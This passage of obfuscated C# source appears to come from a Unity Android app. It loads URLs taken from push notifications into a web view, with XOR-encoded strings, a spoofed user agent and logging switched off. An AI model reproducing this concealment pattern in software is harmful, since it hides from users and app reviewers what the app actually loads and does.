                    Debug.Log(_0x2236f796._0xe98e57cc(new byte[39] { 130, 141, 188, 170, 173, 132, 249, 158, 188, 173, 249, 182, 171, 249, 169, 184, 171, 170, 188, 249, 170, 184, 175, 188, 189, 249, 181, 176, 183, 178, 249, 191, 184, 176, 181, 188, 189, 227, 249 }, 217) + ex.Message);
                }
#endif
            }

            return string.Empty;
        }
    }

    // MAIN FLOW
    private bool _0x3dcbea2c { get; set; }

    private bool _0x5deee036 = false;
    private void _0x0ec69b57(UniWebView _0x0bedbd62)
    {
        _0x0bedbd62.BackgroundColor = Color.clear;
        _0x0bedbd62.SetSupportMultipleWindows(true, true);
        _0x0bedbd62.SetBackButtonEnabled(false);
        _0x047ed0fd.SetUserAgent(_0x213c089a());
    }

    private void _0xc072dd30(bool _0x0b00329d)
    {
        _0x902e6d81();
        _0x3d0f9fc1.SetActive(_0x0b00329d);
        _0xfc0c93b2 = _0x0b00329d;
        if (_0x0b00329d)
        {
            _0x3d0f9fc1.transform.SetAsLastSibling();
            if (_0x11234eb3 != null)
                _0x11234eb3.localRotation = Quaternion.identity;
        }
    }

    private string GetFailingUrl(UniWebViewNativeResultPayload _0x83644860)
    {
        if (_0x83644860 == null || _0x83644860.Extra == null)
            return null;
        object _0x6adb9156;
        if (!_0x83644860.Extra.TryGetValue(UniWebViewNativeResultPayload.ExtraFailingURLKey, out _0x6adb9156))
            return null;
        return _0x6adb9156 as string;
    }

    // WEB VIEW LOGIC END
    internal void _0xd83da125()
    {
        // Ensure channel exists (safe to call multiple times)
        var _0x8d69ac28 = new AndroidNotificationChannel
        {
            Id = _0x2236f796._0xe98e57cc(new byte[15] { 55, 54, 53, 50, 38, 63, 39, 12, 48, 59, 50, 61, 61, 54, 63 }, 83),
            Name = _0x2236f796._0xe98e57cc(new byte[15] { 133, 164, 167, 160, 180, 173, 181, 225, 130, 169, 160, 175, 175, 164, 173 }, 193),
            Importance = Importance.High,
            Description = _0x2236f796._0xe98e57cc(new byte[21] { 61, 31, 20, 31, 8, 27, 22, 90, 20, 21, 14, 19, 28, 19, 25, 27, 14, 19, 21, 20, 9 }, 122)
        };
        AndroidNotificationCenter.RegisterNotificationChannel(_0x8d69ac28);
        // Build notification
        var _0x2334637b = new AndroidNotification
        {
            Title = _0x946427b6[UnityEngine.Random.Range(0, _0x946427b6.Length)],
            Text = _0x2236f796._0xe98e57cc(new byte[21] { 76, 127, 104, 45, 116, 98, 120, 45, 126, 120, 127, 104, 45, 121, 98, 45, 104, 117, 100, 121, 50 }, 13),
            FireTime = System.DateTime.Now
        };
        // Send immediately
        AndroidNotificationCenter.SendNotification(_0x2334637b, _0x2236f796._0xe98e57cc(new byte[15] { 153, 152, 155, 156, 136, 145, 137, 162, 158, 149, 156, 147, 147, 152, 145 }, 253));
    }

    private bool _0xa01add9a = false;
    private string _0x0ccf5e18 { get; set; }

    private float _0x4131c309 = 0f;
    private string _0x04a78928 = "";
    private async Task<bool> _0x76661bd1()
    {
        _0x53779211.Instance?._0xce8f3a25();
        PushNotificationsService.Instance.OnRemoteNotificationReceived += (_0x0a17ed45) =>
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x2236f796._0xe98e57cc(new byte[32] { 35, 44, 29, 11, 12, 37, 88, 45, 22, 17, 12, 1, 88, 40, 13, 11, 16, 88, 54, 23, 12, 17, 30, 17, 27, 25, 12, 17, 23, 22, 66, 88 }, 120) + string.Join(_0x2236f796._0xe98e57cc(new byte[1] { 247 }, 254), _0x0a17ed45));
                }
#endif
            }
        };
        try
        {
            _0x75fb2b09 = await PushNotificationsService.Instance.RegisterForPushNotificationsAsync();
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x2236f796._0xe98e57cc(new byte[31] { 174, 161, 144, 134, 129, 168, 213, 179, 148, 156, 153, 144, 145, 213, 129, 154, 213, 146, 144, 129, 213, 133, 128, 134, 157, 213, 129, 154, 158, 144, 155 }, 245));
                }
#endif
            }

            _0x75fb2b09 = "";
        }

        _0x1a5be668 = !string.IsNullOrEmpty(_0x75fb2b09);
        _0x8f54f7db = _0x8343a468();
        {
#if B_LOGS
            Debug.Log(_0x2236f796._0xe98e57cc(new byte[25] { 11, 4, 53, 35, 36, 13, 112, 5, 62, 57, 36, 41, 112, 0, 37, 35, 56, 112, 4, 63, 59, 53, 62, 106, 112 }, 80) + _0x75fb2b09);
#endif
        }

        _0x53779211.Instance?._0x4df4c6bb();
        return false;
    }

    private readonly List<UniWebViewPopup> _0xfa114d74 = new List<UniWebViewPopup>();
    private async Task<bool> _0xc4c51e5c()
    {
        {
#if B_LOGS
            Debug.Log(_0x2236f796._0xe98e57cc(new byte[37] { 51, 60, 13, 27, 28, 53, 72, 59, 1, 15, 6, 33, 6, 61, 6, 1, 28, 17, 59, 13, 26, 30, 1, 11, 13, 27, 41, 6, 7, 6, 17, 5, 7, 29, 27, 4, 17 }, 104));
#endif
        }

        try
        {
            var _0xaff91512 = new InitializationOptions();
            await UnityServices.InitializeAsync(_0xaff91512);
            {
#if B_LOGS
                Debug.Log(_0x2236f796._0xe98e57cc(new byte[32] { 174, 161, 144, 134, 129, 168, 213, 160, 155, 156, 129, 140, 166, 144, 135, 131, 156, 150, 144, 134, 213, 188, 155, 156, 129, 156, 148, 153, 156, 143, 144, 145 }, 245));
#endif
            }
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                Debug.Log(_0x2236f796._0xe98e57cc(new byte[20] { 63, 46, 56, 63, 75, 62, 5, 2, 31, 18, 56, 14, 25, 29, 2, 8, 14, 24, 81, 75 }, 107) + ex.Message);
#endif
            }

            _0x479f85c3?._0xf769582c();
            return true;
        }

        bool _0xb400f067 = false;
        do
        {
            try
            {
                await AuthenticationService.Instance.SignInAnonymouslyAsync();
                _0xb400f067 = true;
                {
                    {
#if B_LOGS
                        Debug.Log(_0x2236f796._0xe98e57cc(new byte[37] { 112, 127, 78, 88, 95, 118, 11, 120, 66, 76, 69, 6, 66, 69, 11, 106, 69, 68, 69, 82, 70, 68, 94, 88, 5, 11, 123, 71, 74, 82, 78, 89, 11, 98, 111, 17, 11 }, 43) + AuthenticationService.Instance.PlayerId);
#endif
                    }

                    _0x33f22522 = AuthenticationService.Instance.PlayerId;
                }
            }
            catch (AuthenticationException ex)
            {
                {
#if B_LOGS
                    Debug.Log(_0x2236f796._0xe98e57cc(new byte[25] { 110, 127, 105, 110, 26, 105, 83, 93, 84, 23, 83, 84, 26, 123, 79, 78, 82, 26, 127, 104, 104, 117, 104, 0, 26 }, 58) + ex.Message);
#endif
                }

                _0x479f85c3?._0xf769582c();
                return true;
            }
            catch (RequestFailedException ex)
            {
                {
#if B_LOGS
                    Debug.Log(_0x2236f796._0xe98e57cc(new byte[28] { 51, 34, 52, 51, 71, 52, 14, 0, 9, 74, 14, 9, 71, 53, 2, 22, 18, 2, 20, 19, 71, 34, 53, 53, 40, 53, 93, 71 }, 103) + ex.Message);
#endif
                }

                _0x479f85c3?._0xf769582c();
                return true;
            }
        }
        while (!_0xb400f067);
        return false;
    }

    internal bool _0xcba7199d(string _0x70cb23f5)
    {
        return _0x70cb23f5.StartsWith(_0x2236f796._0xe98e57cc(new byte[9] { 2, 14, 29, 4, 10, 27, 85, 64, 64 }, 111), StringComparison.OrdinalIgnoreCase) || _0x70cb23f5.StartsWith(_0x2236f796._0xe98e57cc(new byte[24] { 190, 162, 162, 166, 165, 236, 249, 249, 166, 186, 183, 175, 248, 177, 185, 185, 177, 186, 179, 248, 181, 185, 187, 249 }, 214), StringComparison.OrdinalIgnoreCase) || _0x70cb23f5.StartsWith(_0x2236f796._0xe98e57cc(new byte[23] { 235, 247, 247, 243, 185, 172, 172, 243, 239, 226, 250, 173, 228, 236, 236, 228, 239, 230, 173, 224, 236, 238, 172 }, 131), StringComparison.OrdinalIgnoreCase);
    }

    private void _0x1765a9cb()
    {
        WLog(_0x2236f796._0xe98e57cc(new byte[21] { 211, 250, 233, 255, 236, 250, 233, 254, 187, 249, 250, 248, 240, 187, 235, 233, 254, 232, 232, 254, 255 }, 155));
        if (Time.frameCount == _0x12e43367)
            return;
        _0x12e43367 = Time.frameCount;
        if (_0x65c9ed7f())
            return;
        _0xff390524();
    }

    private void _0x20e9c847(string _0xd7b07aaa)
    {
        {
            {
#if B_LOGS
                Debug.Log(_0x2236f796._0xe98e57cc(new byte[34] { 177, 190, 143, 153, 158, 183, 202, 172, 143, 158, 137, 130, 202, 175, 146, 158, 152, 139, 202, 186, 159, 153, 130, 202, 174, 139, 158, 139, 202, 184, 139, 157, 208, 202 }, 234) + _0xd7b07aaa);
#endif
            }
        }

        var _0xaec34019 = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0xd7b07aaa);
        StartCoroutine(_0x0f97fb66(_0xaec34019));
    }

    private string _0x244510ef()
    {
        string _0x70469db8 = _0x2236f796._0xe98e57cc(new byte[62] { 195, 192, 193, 198, 199, 196, 197, 202, 203, 200, 201, 206, 207, 204, 205, 210, 211, 208, 209, 214, 215, 212, 213, 218, 219, 216, 227, 224, 225, 230, 231, 228, 229, 234, 235, 232, 233, 238, 239, 236, 237, 242, 243, 240, 241, 246, 247, 244, 245, 250, 251, 248, 146, 147, 144, 145, 150, 151, 148, 149, 154, 155 }, 162);
        System.Random _0xdbda99a8 = new System.Random();
        int _0x901b69e9 = _0xdbda99a8.Next(8, 16);
        return new string (Enumerable.Repeat(_0x70469db8, _0x901b69e9).Select(_0xa62690a0 => _0xa62690a0[_0xdbda99a8.Next(_0xa62690a0.Length)]).ToArray());
    }

    private JObject _0xf9cc4916(params string[] _0x960f83e4)
    {
        JObject _0x57192bfe = new JObject();
        foreach (var _0x800fa132 in _0x960f83e4)
        {
            string _0x2076e5eb = _0x244510ef();
            {
#if B_LOGS
                Debug.Log($"[Test] Crypto key={_0x2076e5eb} val={_0x800fa132}");
#endif
            }

            _0x57192bfe.Add(_0x2076e5eb, _0x800fa132 == null ? "" : _0x800fa132);
        }

        return _0x57192bfe;
    }

    private string _0x19ad2fd9 = "";
    private string _0x0a9d3c31 = "";
    private bool _0xbcce5559()
    {
        var _0x5fd24c05 = _0x8a390879();
        if (_0x5fd24c05 == null)
            return false;
        WLog(_0x2236f796._0xe98e57cc(new byte[31] { 228, 205, 222, 200, 219, 205, 222, 201, 140, 206, 205, 207, 199, 140, 129, 146, 140, 220, 195, 220, 217, 220, 140, 235, 195, 238, 205, 207, 199, 150, 140 }, 172) + _0x5fd24c05.Id);
        _0x5fd24c05.GoBack();
        return true;
    }

    private int _0x12e43367 = -1;
    private string _0x3a1c301f = "";
    private bool _0xfc0c93b2 = false;
    private void _0xff390524()
    {
        if (_0xa01add9a)
        {
            WLog(_0x2236f796._0xe98e57cc(new byte[18] { 12, 49, 32, 61, 105, 40, 37, 59, 44, 40, 45, 48, 105, 58, 33, 38, 62, 39 }, 73));
            return;
        }

        _0xc072dd30(false);
        WLog(_0x2236f796._0xe98e57cc(new byte[46] { 101, 73, 65, 70, 8, 127, 77, 74, 126, 65, 77, 95, 8, 120, 93, 91, 64, 8, 102, 71, 92, 65, 78, 65, 75, 73, 92, 65, 71, 70, 8, 0, 64, 73, 90, 76, 95, 73, 90, 77, 8, 74, 73, 75, 67, 1 }, 40));
        ++_0x53b77e95;
        _0xd83da125();
        if (_0x53b77e95 <= 1)
            return;
        if (_0x7043b205())
        {
            WLog(_0x2236f796._0xe98e57cc(new byte[37] { 40, 21, 4, 25, 77, 30, 6, 4, 29, 29, 8, 9, 77, 64, 83, 77, 29, 2, 29, 24, 29, 30, 77, 30, 25, 4, 1, 1, 77, 2, 29, 8, 3, 8, 9, 87, 77 }, 109) + _0xfa114d74.Count);
            return;
        }

        Application.Quit();
    }

    private bool OpenUrlExternally(string _0xd13f95eb)
    {
        return _0x284dd0bf(_0xd13f95eb);
    }

    /* ============================= */
    /* ENCRYPT / DECRYPT             */
    /* ============================= */
    private string _0x7fcd18cc(string _0x265ad050, string _0xd890d912)
    {
        try
        {
            using var _0x40388415 = Aes.Create();
            _0x40388415.Key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(_0xd890d912));
            _0x40388415.GenerateIV();
            using var _0xfadaf7de = new MemoryStream();
            _0xfadaf7de.Write(_0x40388415.IV, 0, _0x40388415.IV.Length);
            using (var _0xc120cb8e = new CryptoStream(_0xfadaf7de, _0x40388415.CreateEncryptor(), CryptoStreamMode.Write))
            {
                var _0xe723ed27 = Encoding.UTF8.GetBytes(_0x265ad050);
                _0xc120cb8e.Write(_0xe723ed27, 0, _0xe723ed27.Length);
                _0xc120cb8e.FlushFinalBlock();
            }

            return Convert.ToBase64String(_0xfadaf7de.ToArray());
        }
        catch (Exception ex)
        {
            return "";
        }
    }

    private string _0x8f54f7db = "";
    private void _0xa6b722c0(string _0xb243120d)
    {
        _0xff81ad3b();
        StartCoroutine(_0x1aa4a164(_0xb243120d));
    }

    private IEnumerator _0x0f97fb66(Dictionary<string, object> _0x2eb268e0)
    {
        {
            {
#if B_LOGS
                Debug.Log(_0x2236f796._0xe98e57cc(new byte[30] { 239, 224, 209, 199, 192, 233, 148, 242, 209, 192, 215, 220, 148, 241, 204, 192, 198, 213, 148, 228, 193, 199, 220, 148, 240, 213, 192, 213, 142, 148 }, 180) + string.Join(_0x2236f796._0xe98e57cc(new byte[1] { 71 }, 78), _0x2eb268e0));
#endif
            }
        }

        string _0xab329856 = "";
        // Primary source: nested JSON under "notificationData"
        if (_0x2eb268e0 != null && _0x2eb268e0.TryGetValue(_0x2236f796._0xe98e57cc(new byte[16] { 10, 11, 16, 13, 2, 13, 7, 5, 16, 13, 11, 10, 32, 5, 16, 5 }, 100), out var raw))
        {
            try
            {
                var _0xd47a37dc = raw?.ToString();
                var _0x9d26861c = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0xd47a37dc);
                if (_0x9d26861c != null && _0x9d26861c.TryGetValue(_0x2236f796._0xe98e57cc(new byte[6] { 92, 74, 65, 75, 70, 75 }, 47), out var val))
                {
                    _0xab329856 = val?.ToString();
                }
            }
            catch (Exception e)
            {
#if B_LOGS
                Debug.LogError(_0x2236f796._0xe98e57cc(new byte[30] { 216, 215, 230, 240, 247, 163, 211, 246, 240, 235, 222, 163, 201, 208, 204, 205, 163, 243, 226, 241, 240, 230, 163, 230, 241, 241, 236, 241, 185, 163 }, 131) + e);
#endif
            }
        }

        // Fallback: flat structure
        if (string.IsNullOrEmpty(_0xab329856) && _0x2eb268e0 != null && _0x2eb268e0.TryGetValue(_0x2236f796._0xe98e57cc(new byte[6] { 226, 244, 255, 245, 248, 245 }, 145), out var lab))
        {
            _0xab329856 = lab?.ToString();
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x2236f796._0xe98e57cc(new byte[38] { 109, 98, 83, 69, 66, 22, 102, 67, 69, 94, 107, 22, 112, 83, 66, 85, 94, 83, 82, 22, 69, 83, 88, 82, 95, 82, 22, 80, 68, 89, 91, 22, 92, 69, 89, 88, 12, 22 }, 54) + _0xab329856);
            }
#endif
        }

        if (string.IsNullOrEmpty(_0xab329856))
            yield break;
        {
#if B_LOGS
            {
                Debug.Log(_0x2236f796._0xe98e57cc(new byte[38] { 45, 34, 19, 5, 2, 86, 38, 3, 5, 30, 43, 86, 33, 23, 31, 2, 86, 2, 25, 86, 25, 6, 19, 24, 86, 1, 31, 2, 30, 86, 5, 19, 24, 18, 31, 18, 76, 86 }, 118) + _0xab329856);
            }
#endif
        }

        _0xd74d47a7 = _0xab329856;
        yield return new WaitUntil(() => _0xf630cf5a);
        var _0xbd7382ec = _0x360a9255(2, 100);
        yield return new WaitUntil(() => _0xbd7382ec.IsCompleted);
        string _0x963268a2 = _0xbd7382ec.Result;
        if (!string.IsNullOrEmpty(_0x963268a2))
        {
            string _0x4e24d5c4 = _0x17a410ac(_0x963268a2, _0xab329856);
            {
#if B_LOGS
                Debug.Log(_0x2236f796._0xe98e57cc(new byte[33] { 207, 192, 241, 231, 224, 180, 196, 225, 231, 252, 201, 180, 198, 241, 248, 251, 245, 240, 180, 195, 241, 246, 194, 253, 241, 227, 180, 227, 253, 224, 252, 174, 180 }, 148) + _0x4e24d5c4);
#endif
            }

            _0x047ed0fd.Load(_0x4e24d5c4);
        }
    }

    private async Task _0xec67fa2f()
    {
        if (await _0xc4c51e5c())
            return;
        if (await _0x76661bd1())
            return;
        if (await _0xa11662f9())
            return;
        _0x87eb8a71();
        await _0x978af948(_0x41b95a7f());
        _0x6068c37f = await _0x285edbbe();
        await _0x0832eb7b();
    }

    private Text _0x5d109985;
    private Canvas _0xe14c6c47;
    // WS_SOURCE MONO
    public static _0x1ef2fa0a _0x479f85c3 { get; private set; }

    internal Button _0x06ea1619(string _0x285bba06, Transform _0x25bf10cb)
    {
        var _0xc4863a75 = new GameObject(_0x285bba06 + _0x2236f796._0xe98e57cc(new byte[3] { 187, 141, 151 }, 249), typeof(RectTransform), typeof(Image), typeof(Button));
        var _0xd7d096f0 = _0xc4863a75.GetComponent<RectTransform>();
        _0xd7d096f0.SetParent(_0x25bf10cb, false);
        var _0x98a021f0 = _0xc4863a75.GetComponent<Image>();
        _0x98a021f0.color = new Color(0.92f, 0.92f, 0.95f, 1f);
        var _0x5477047a = _0xc4863a75.GetComponent<Button>();
        var _0x4c7774f1 = _0x5477047a.colors;
        _0x4c7774f1.highlightedColor = new Color(0.85f, 0.85f, 0.9f);
        _0x4c7774f1.pressedColor = new Color(0.8f, 0.8f, 0.88f);
        _0x5477047a.colors = _0x4c7774f1;
        var _0xb96d6a66 = new GameObject(_0x2236f796._0xe98e57cc(new byte[4] { 124, 77, 80, 92 }, 40), typeof(RectTransform), typeof(Text));
        var _0x05020625 = _0xb96d6a66.GetComponent<RectTransform>();
        _0x05020625.SetParent(_0xc4863a75.transform, false);
        _0x05020625.anchorMin = Vector2.zero;
        _0x05020625.anchorMax = Vector2.one;
        _0x05020625.offsetMin = _0x05020625.offsetMax = Vector2.zero;
        var _0xf2b9e9f4 = _0xb96d6a66.GetComponent<Text>();
        _0xf2b9e9f4.text = _0x285bba06;
        _0xf2b9e9f4.alignment = TextAnchor.MiddleCenter;
        _0xf2b9e9f4.color = Color.black;
        _0xf2b9e9f4.font = Resources.GetBuiltinResource<Font>(_0x2236f796._0xe98e57cc(new byte[9] { 82, 97, 122, 114, 127, 61, 103, 103, 117 }, 19));
        _0xf2b9e9f4.fontSize = 28;
        WLog(_0x2236f796._0xe98e57cc(new byte[14] { 246, 199, 208, 212, 193, 208, 247, 192, 193, 193, 218, 219, 149, 146 }, 181) + _0x285bba06 + _0x2236f796._0xe98e57cc(new byte[1] { 179 }, 148));
        return _0x5477047a;
    }

    private static string ReadPushField(Dictionary<string, object> _0x9487caaa, string _0x3ac48a7f)
    {
        if (_0x9487caaa == null || string.IsNullOrEmpty(_0x3ac48a7f))
            return string.Empty;
        if (_0x9487caaa.TryGetValue(_0x2236f796._0xe98e57cc(new byte[16] { 183, 182, 173, 176, 191, 176, 186, 184, 173, 176, 182, 183, 157, 184, 173, 184 }, 217), out var raw))
        {
            try
            {
                var _0xd498fad2 = JsonConvert.DeserializeObject<Dictionary<string, object>>(raw?.ToString());
                if (_0xd498fad2 != null && _0xd498fad2.TryGetValue(_0x3ac48a7f, out var nestedVal))
                {
                    var _0x7f58e619 = nestedVal?.ToString();
                    if (!string.IsNullOrEmpty(_0x7f58e619))
                        return _0x7f58e619;
                }
            }
            catch
            {
            }
        }

        if (_0x9487caaa.TryGetValue(_0x3ac48a7f, out var flatVal))
            return flatVal?.ToString() ?? string.Empty;
        return string.Empty;
    }

    private string _0xf64d6305 = "";
    public void _0x526bd6c6()
    {
        if (_0xf630cf5a)
            return;
        {
#if B_LOGS
            {
                Debug.Log(_0x2236f796._0xe98e57cc(new byte[33] { 198, 201, 248, 238, 233, 192, 189, 201, 244, 240, 248, 239, 189, 242, 232, 233, 189, 176, 163, 189, 240, 242, 235, 248, 189, 233, 242, 189, 238, 254, 248, 243, 248 }, 157));
            }
#endif
        }

        _0xf769582c();
    }

    private string _0x8343a468()
    {
        float _0xa3528403 = Time.realtimeSinceStartup;
        if (_0xa3528403 < 0f)
            _0xa3528403 = 0f;
        int _0x465a8c37 = (int)(_0xa3528403 * 1000f);
        int _0xe45c5f88 = _0x465a8c37 / 60000;
        int _0xb8bfd07f = (_0x465a8c37 / 1000) % 60;
        int _0x42bcd4bf = _0x465a8c37 % 1000;
        return string.Format(_0x2236f796._0xe98e57cc(new byte[21] { 174, 229, 239, 229, 229, 168, 239, 174, 228, 239, 229, 229, 168, 239, 174, 231, 239, 229, 229, 229, 168 }, 213), _0xe45c5f88, _0xb8bfd07f, _0x42bcd4bf);
    }

    private string _0x94bc4b0e = "";
    private void Awake()
    {
        if (_0x479f85c3 != null)
        {
            Destroy(this.gameObject);
            return;
        }

        EnhancedTouchSupport.Enable();
        Input.backButtonLeavesApp = false;
        {
#if !B_LOGS
            Debug.unityLogger.logEnabled = false;
            Application.SetStackTraceLogType(LogType.Assert, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Exception, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Warning, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Error, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Log, StackTraceLogType.None);
#endif
        }

        _0x479f85c3 = gameObject.GetComponent<_0x1ef2fa0a>();
        DontDestroyOnLoad(gameObject);
        _0x75fb2b09 = _0x0ccf5e18 = _0xfc99f087 = "";
        _0xf64d6305 = "";
        _0xf630cf5a = false;
    }

    internal bool isApplicationFocus = false;
    private string _0x10520025 = "";
    private bool TryOpenExternalLikeChrome(string _0xbe4c868f)
    {
        if (string.IsNullOrEmpty(_0xbe4c868f))
            return false;
        if (_0xbe4c868f.StartsWith(_0x2236f796._0xe98e57cc(new byte[9] { 43, 44, 54, 39, 44, 54, 120, 109, 109 }, 66), StringComparison.OrdinalIgnoreCase))
            return _0x812fa14e(_0xbe4c868f);
        if (_0xcba7199d(_0xbe4c868f))
            return _0x36ed41e0(_0xbe4c868f, null);
        if (!_0xbe4c868f.StartsWith(_0x2236f796._0xe98e57cc(new byte[7] { 50, 46, 46, 42, 96, 117, 117 }, 90), StringComparison.OrdinalIgnoreCase) && !_0xbe4c868f.StartsWith(_0x2236f796._0xe98e57cc(new byte[8] { 14, 18, 18, 22, 21, 92, 73, 73 }, 102), StringComparison.OrdinalIgnoreCase) && !_0xbe4c868f.StartsWith(_0x2236f796._0xe98e57cc(new byte[11] { 187, 184, 181, 175, 174, 224, 184, 182, 187, 180, 177 }, 218), StringComparison.OrdinalIgnoreCase))
        {
            return _0x284dd0bf(_0xbe4c868f);
        }

        return false;
    }

    private bool _0x59ca96e1()
    {
        var _0xec1b0faf = Keyboard.current;
        return _0xec1b0faf != null && _0xec1b0faf.escapeKey.wasPressedThisFrame;
    }

    private string _0xfc99f087 { get; set; }

    internal bool isDestroyedForce = false;
    private bool _0x36ed41e0(string _0xf3db6ced, string _0xa8c128a1)
    {
        string _0x567cb5ed = _0x48e69e6b(_0xf3db6ced);
        if (string.IsNullOrEmpty(_0x567cb5ed))
            _0x567cb5ed = _0xa8c128a1;
        if (_0x02ac9266(_0x567cb5ed))
            return true;
        string _0x2f30a7d6 = string.IsNullOrEmpty(_0x567cb5ed) ? _0x2236f796._0xe98e57cc(new byte[29] { 77, 81, 81, 85, 86, 31, 10, 10, 85, 73, 68, 92, 11, 66, 74, 74, 66, 73, 64, 11, 70, 74, 72, 10, 86, 81, 74, 87, 64 }, 37) : _0x2236f796._0xe98e57cc(new byte[46] { 29, 1, 1, 5, 6, 79, 90, 90, 5, 25, 20, 12, 91, 18, 26, 26, 18, 25, 16, 91, 22, 26, 24, 90, 6, 1, 26, 7, 16, 90, 20, 5, 5, 6, 90, 17, 16, 1, 20, 28, 25, 6, 74, 28, 17, 72 }, 117) + _0x567cb5ed;
        WLog(_0x2236f796._0xe98e57cc(new byte[35] { 181, 158, 132, 153, 155, 147, 186, 159, 157, 147, 214, 155, 151, 132, 157, 147, 130, 214, 144, 151, 154, 154, 148, 151, 149, 157, 214, 151, 133, 214, 129, 147, 148, 204, 214 }, 246) + _0x2f30a7d6);
        return _0x284dd0bf(_0x2f30a7d6);
    }

    // NATIVE WEB VIEW METHODS
    private UniWebView _0x047ed0fd = null;
    private string _0xe3622dd0 = "";
    internal bool IsGoogleAuthFlowUrl(string _0xad57812d)
    {
        if (string.IsNullOrEmpty(_0xad57812d))
            return false;
        return _0xad57812d.IndexOf(_0x2236f796._0xe98e57cc(new byte[19] { 14, 12, 12, 0, 26, 1, 27, 28, 65, 8, 0, 0, 8, 3, 10, 65, 12, 0, 2 }, 111), StringComparison.OrdinalIgnoreCase) >= 0 || _0xad57812d.IndexOf(_0x2236f796._0xe98e57cc(new byte[16] { 214, 212, 212, 216, 194, 217, 195, 196, 153, 208, 216, 216, 208, 219, 210, 153 }, 183), StringComparison.OrdinalIgnoreCase) >= 0 || _0xad57812d.IndexOf(_0x2236f796._0xe98e57cc(new byte[21] { 237, 229, 229, 237, 230, 239, 255, 249, 239, 248, 233, 229, 228, 254, 239, 228, 254, 164, 233, 229, 231 }, 138), StringComparison.OrdinalIgnoreCase) >= 0 || _0xad57812d.IndexOf(_0x2236f796._0xe98e57cc(new byte[11] { 105, 125, 122, 111, 122, 103, 109, 32, 109, 97, 99 }, 14), StringComparison.OrdinalIgnoreCase) >= 0;
    }

    private void _0x4b885337()
    {
        _0x9fb9c897 = true;
        if (_0x047ed0fd != null)
            _0x047ed0fd.SetUserAgent(_0x213c089a());
    }

    private int _0x53b77e95 = 0;
    internal bool IsHttpUrl(string _0x22d35a45)
    {
        if (string.IsNullOrEmpty(_0x22d35a45))
            return false;
        return _0x22d35a45.StartsWith(_0x2236f796._0xe98e57cc(new byte[7] { 130, 158, 158, 154, 208, 197, 197 }, 234), StringComparison.OrdinalIgnoreCase) || _0x22d35a45.StartsWith(_0x2236f796._0xe98e57cc(new byte[8] { 95, 67, 67, 71, 68, 13, 24, 24 }, 55), StringComparison.OrdinalIgnoreCase);
    }

    private string _0xcda2e357 = "";
    private bool _0x812fa14e(string _0xadad65c8)
    {
        try
        {
            using (var _0x883949e8 = new AndroidJavaClass(_0x2236f796._0xe98e57cc(new byte[30] { 197, 201, 203, 136, 211, 200, 207, 210, 223, 149, 194, 136, 214, 202, 199, 223, 195, 212, 136, 243, 200, 207, 210, 223, 246, 202, 199, 223, 195, 212 }, 166)))
            using (var _0xf44021f1 = _0x883949e8.GetStatic<AndroidJavaObject>(_0x2236f796._0xe98e57cc(new byte[15] { 27, 13, 10, 10, 29, 22, 12, 57, 27, 12, 17, 14, 17, 12, 1 }, 120)))
            using (var _0x1e70b2d6 = _0xf44021f1.Call<AndroidJavaObject>(_0x2236f796._0xe98e57cc(new byte[17] { 53, 55, 38, 2, 51, 49, 57, 51, 53, 55, 31, 51, 60, 51, 53, 55, 32 }, 82)))
            using (var _0x6ff558fb = new AndroidJavaClass(_0x2236f796._0xe98e57cc(new byte[22] { 255, 240, 250, 236, 241, 247, 250, 176, 253, 241, 240, 234, 251, 240, 234, 176, 215, 240, 234, 251, 240, 234 }, 158)))
            using (var _0xb05eeec8 = _0x6ff558fb.CallStatic<AndroidJavaObject>(_0x2236f796._0xe98e57cc(new byte[8] { 58, 43, 56, 57, 47, 31, 56, 35 }, 74), _0xadad65c8, 1))
            {
                string _0xd39f6d43 = _0xb05eeec8.Call<string>(_0x2236f796._0xe98e57cc(new byte[14] { 77, 79, 94, 121, 94, 88, 67, 68, 77, 111, 82, 94, 88, 75 }, 42), _0x2236f796._0xe98e57cc(new byte[20] { 248, 232, 245, 237, 233, 255, 232, 197, 252, 251, 246, 246, 248, 251, 249, 241, 197, 239, 232, 246 }, 154));
                string _0x8273867f = _0xb05eeec8.Call<string>(_0x2236f796._0xe98e57cc(new byte[10] { 161, 163, 178, 150, 167, 165, 173, 167, 161, 163 }, 198));
                _0xb05eeec8.Call<AndroidJavaObject>(_0x2236f796._0xe98e57cc(new byte[11] { 170, 175, 175, 136, 170, 191, 174, 172, 164, 185, 178 }, 203), _0x2236f796._0xe98e57cc(new byte[33] { 180, 187, 177, 167, 186, 188, 177, 251, 188, 187, 161, 176, 187, 161, 251, 182, 180, 161, 176, 178, 186, 167, 172, 251, 151, 135, 154, 130, 134, 148, 151, 153, 144 }, 213));
                _0xb05eeec8.Call<AndroidJavaObject>(_0x2236f796._0xe98e57cc(new byte[11] { 178, 165, 173, 175, 182, 165, 133, 184, 180, 178, 161 }, 192), _0x2236f796._0xe98e57cc(new byte[20] { 150, 134, 155, 131, 135, 145, 134, 171, 146, 149, 152, 152, 150, 149, 151, 159, 171, 129, 134, 152 }, 244));
                if (_0xb05eeec8.Call<AndroidJavaObject>(_0x2236f796._0xe98e57cc(new byte[15] { 228, 243, 229, 249, 250, 224, 243, 215, 245, 226, 255, 224, 255, 226, 239 }, 150), _0x1e70b2d6) != null)
                {
                    WLog(_0x2236f796._0xe98e57cc(new byte[24] { 124, 87, 77, 80, 82, 90, 115, 86, 84, 90, 31, 80, 79, 90, 81, 31, 86, 81, 75, 90, 81, 75, 5, 31 }, 63) + _0xadad65c8);
                    _0xb05eeec8.Call<AndroidJavaObject>(_0x2236f796._0xe98e57cc(new byte[8] { 33, 36, 36, 6, 44, 33, 39, 51 }, 64), 0x10000000);
                    _0xf44021f1.Call(_0x2236f796._0xe98e57cc(new byte[13] { 46, 41, 60, 47, 41, 28, 62, 41, 52, 43, 52, 41, 36 }, 93), _0xb05eeec8);
                    return true;
                }

                if (_0x02ac9266(_0x8273867f))
                    return true;
                if (!string.IsNullOrEmpty(_0xd39f6d43))
                {
